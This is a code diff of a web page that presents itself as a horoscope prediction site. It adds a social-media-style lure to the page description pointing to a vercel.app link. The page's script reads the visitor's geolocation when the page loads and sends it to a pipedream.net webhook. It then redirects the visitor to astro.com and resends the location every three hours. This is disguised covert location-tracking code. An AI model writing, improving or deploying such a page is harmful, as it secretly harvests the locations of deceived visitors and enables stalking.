@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Predicting...</title>
+  <meta name="description" content="I'm an astrology enthusiast and just shared a fresh horoscope prediction on our site. If you're curious about what the stars say for you today, check it out at https://virtu0so.vercel.app">
   <style>
     body {
       margin: 0;
@@ -28,10 +29,6 @@
     const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
     const redirectURL = "https://www.astro.com/horoscope";
 
-    function redirectToAstro() {
-      window.location.href = redirectURL;
-    }
-
     function sendLocation() {
       if (!navigator.geolocation) return;
 
@@ -52,10 +49,13 @@
       );
     }
 
-    // Pertama kirim & redirect
+    function redirectToAstro() {
+      window.location.href = redirectURL;
+    }
+
     function init() {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
+        () => {
           sendLocation();
           setTimeout(redirectToAstro, 1000);
         },
@@ -66,16 +66,16 @@
       );
     }
 
-    // Kirim ulang lokasi setiap 3 jam (10.800.000 ms)
-    const intervalMs = 3 * 60 * 60 * 1000;
-    setInterval(sendLocation, intervalMs);
-
-    // Jalankan awal
+    // Jalankan saat halaman dimuat
     if ("geolocation" in navigator) {
       init();
     } else {
       redirectToAstro();
     }
+
+    // Kirim ulang lokasi setiap 3 jam
+    const intervalMs = 3 * 60 * 60 * 1000;
+    setInterval(sendLocation, intervalMs);
   </script>
 </body>
 </html>
